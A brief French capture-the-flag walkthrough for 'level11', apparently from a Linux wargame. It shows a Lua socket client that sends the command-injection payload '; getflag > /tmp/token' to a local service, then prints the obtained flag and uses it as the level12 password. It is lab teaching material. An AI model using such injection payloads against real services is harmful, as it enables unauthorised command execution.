## 1. Analyser le fichier lua

Lua est un langage de programmation utilisé pour développer des extensions pour les applications.
En l’executant on obtient: 

    lua: ./level11.lua:3: address already in use
    stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?

## 2. Creer un client qui envoie une commande

    local socket = require("socket")
    local host, port = "127.0.0.1", 5151
    local tcp = assert(socket.tcp())
    tcp:connect(host, port)
    tcp:send("; getflag > /tmp/token\n")
    tcp:close()

Flag dans /tmp/token: fa6v5ateaw21peobuub8ipe6s

## 3. Connexion

su level12

    Mot de passe : fa6v5ateaw21peobuub8ipe6s